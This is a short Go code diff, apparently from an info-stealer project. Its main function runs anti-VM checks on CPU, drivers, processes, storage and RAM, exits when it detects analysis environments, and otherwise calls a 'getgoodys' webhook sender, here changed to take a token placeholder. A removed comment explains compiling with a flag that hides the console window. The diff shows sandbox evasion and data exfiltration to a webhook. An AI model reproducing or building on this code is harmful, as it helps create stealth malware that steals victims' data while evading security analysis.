@@ -12,8 +12,8 @@ func main() {
 	if antivm.CheckCPU() != false || antivm.CheckDrivers() != false || antivm.GetProc() != false || antivm.CheckStorage() != false || antivm.GetRam() != false {
 		return
 	}
-	getgoodys.Send_webhook()
+	getgoodys.Send_webhook("") // << insert token here
 
 }
 
-// when compiling you must use : go run -ldflags="-H windowsgui" gioui.org/example/hello@latest to remove CMD
+
